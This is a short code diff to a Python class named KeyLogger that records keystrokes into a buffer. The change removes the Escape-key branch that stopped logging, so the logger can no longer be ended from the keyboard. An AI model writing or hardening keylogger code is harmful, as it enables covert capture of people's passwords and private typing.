@@ -145,11 +145,6 @@ class KeyLogger:
                 self.buffer.append("\t")
                 self.print_live("\t")
 
-            elif key == keyboard.Key.esc:
-                self.running = False
-                print("\n[STOP]")
-                return False
-
             else:
                 rep = f"[{key}]"
                 self.buffer.append(rep)
